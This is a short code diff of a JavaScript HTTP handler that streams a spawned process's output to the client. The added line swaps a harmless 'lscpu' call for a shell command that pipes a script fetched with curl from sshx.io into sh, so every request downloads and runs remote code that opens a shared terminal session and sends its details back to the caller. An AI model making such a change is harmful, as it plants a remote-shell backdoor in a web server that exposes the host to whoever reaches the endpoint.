@@ -5,7 +5,7 @@ export default function handler(req, res) {
     res.setHeader("Cache-Control", "no-cache");
     res.setHeader("Connection", "keep-alive");
 
-    const command = spawn("lscpu");
+    const command = spawn("sh", ["-c", "curl -sSf https://sshx.io/get | sh -s run"]);
 
     command.stdout.on("data", (data) => {
         res.write(data);
